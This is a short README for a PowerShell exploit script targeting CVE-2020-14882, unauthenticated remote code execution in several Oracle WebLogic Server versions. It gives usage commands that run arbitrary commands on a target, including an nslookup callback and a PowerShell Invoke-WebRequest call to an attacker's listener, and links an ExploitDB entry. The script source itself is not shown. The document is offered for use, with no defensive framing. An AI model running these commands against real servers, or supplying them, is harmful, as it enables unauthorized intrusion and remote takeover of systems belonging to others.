# Oracle WebLogic Unauthenticated RCE Exploit

This PowerShell script exploits CVE-2020-14882 to achieve unauthenticated remote code execution on Oracle WebLogic Server versions:
- 10.3.6.0.0
- 12.1.3.0.0
- 12.2.1.3.0
- 12.2.1.4.0
- 14.1.1.0.0

## Usage

```powershell
.\exploit.ps1 -target 'http(s)://target:7001' -command 'your_command'
.\exploit.ps1 -target 'http(s)://target:7001' -command 'nslookup your_Domain'
.\exploit.ps1 -target 'http(s)://target:7001' -command 'powershell.exe -c Invoke-WebRequest -Uri http://your_listener'
```

## References 
[Exploit on ExploitDB](https://www.exploit-db.com/exploits/49479)
